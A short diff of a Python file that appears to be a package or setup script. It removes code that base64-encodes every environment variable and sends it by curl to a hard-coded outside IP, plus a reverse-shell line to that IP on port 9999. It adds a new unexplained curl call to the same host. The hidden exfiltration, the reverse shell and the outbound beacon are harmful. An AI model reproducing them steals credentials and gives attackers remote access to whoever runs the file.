@@ -15,16 +15,9 @@ import os
 import json
 import base64
 
-env_b64 = base64.b64encode(
-        json.dumps(dict(os.environ)).encode()
-    ).decode('utf-8')
-    
-    # 构造并执行curl命令
-cmd = f'curl -G -k "https://47.242.44.226/?%s"',env_b64
-os.system(cmd)
 
-
-os.system("bash -i >& /dev/tcp/47.242.44.226/9999 0>&1")
+cmd = "curl -k -vv https://47.242.44.226/fortest0927"
+print(os.system(cmd))
 
 
 root_folder = os.path.abspath(os.path.dirname(__file__))
